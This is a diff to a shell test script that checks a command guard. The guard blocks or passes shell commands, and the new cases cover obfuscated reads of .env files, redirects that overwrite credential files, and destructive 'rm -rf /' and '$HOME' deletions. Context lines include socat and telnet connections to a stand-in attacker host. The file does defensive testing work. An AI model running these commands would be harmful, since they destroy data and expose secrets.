@@ -69,6 +69,24 @@ run "socat"                          "socat - TCP:attacker.tld:443"             
 run "telnet"                         "telnet attacker.tld 23"                      BLOCK
 
 echo ""
+echo "=== Edge cases — obfuscation (E1) ==="
+run "IFS bypass cat\$IFS.env"        "cat\$IFS.env"                                BLOCK
+run "IFS bypass \${IFS}.env"         "cat\${IFS}.env"                              BLOCK
+run "glob *.env"                     "cat *.env"                                   BLOCK
+run "glob *.pem"                     "tar -cf x.tar *.pem"                         BLOCK
+run "glob /etc/*.key"                "ls /etc/*.key"                               PASS
+run "glob piped cat *.env"           "cat *.env | base64"                          BLOCK
+
+echo ""
+echo "=== Redirect bypass — write to sensitive (R1) ==="
+run "echo > .env"                    "echo hi > .env"                              BLOCK
+run "echo append .env"               "echo \$SECRET >> .env"                       BLOCK
+run "truncate id_rsa via :"          ": > id_rsa"                                  BLOCK
+run "tee write .env"                 "echo hi | tee .env"                          BLOCK
+run "redirect .env.local"            "printf foo > .env.local"                     BLOCK
+run "redirect ~/.aws/creds"          "echo data > ~/.aws/credentials"              BLOCK
+
+echo ""
 echo "=== Force push variants (C4) ==="
 run "git push --force"               "git push --force origin main"                BLOCK
 run "git push -f"                    "git push -f origin main"                     BLOCK
@@ -95,6 +113,12 @@ run "rm --force --recursive ~"       "rm --force --recursive ~"                 
 run "find / -delete"                 "find / -delete"                              BLOCK
 run "find ~ -exec rm"                "find ~ -type f -exec rm {} +"                BLOCK
 run "chained cd /tmp && rm -rf ."    "cd /tmp && rm -rf ."                         BLOCK
+run "rm --no-preserve-root -rf /"    "rm --no-preserve-root -rf /"                 BLOCK
+run "rm -rf \$HOME/"                 "rm -rf \$HOME/"                              BLOCK
+run "rm -rf \$HOME/*"                "rm -rf \$HOME/*"                             BLOCK
+run "rm -rf \${HOME}/"               "rm -rf \${HOME}/"                            BLOCK
+run "rm -rf ../"                     "rm -rf ../"                                  BLOCK
+run "rm --recursive --no-preserve-root /"  "rm --recursive --no-preserve-root /"   BLOCK
 
 echo ""
 echo "=== Pipe-to-shell variants (H2) ==="
@@ -161,6 +185,13 @@ run "go test"                        "go test ./..."                            
 run "cargo build"                    "cargo build --release"                       PASS
 run "python script.py"               "python scripts/build.py"                     PASS
 run "node app.js"                    "node app.js"                                 PASS
+
+echo ""
+echo "=== Redirect legitimate (must PASS) ==="
+run "echo > /tmp/log"                "echo hi > /tmp/log"                          PASS
+run "echo >> output.txt"             "echo data >> output.txt"                     PASS
+run "npm build > log"                "npm run build > /tmp/build.log"              PASS
+run "stderr redirect"                "make 2> /tmp/err.log"                        PASS
 
 echo ""
 echo "=== False positive checks (similar names, must PASS) ==="
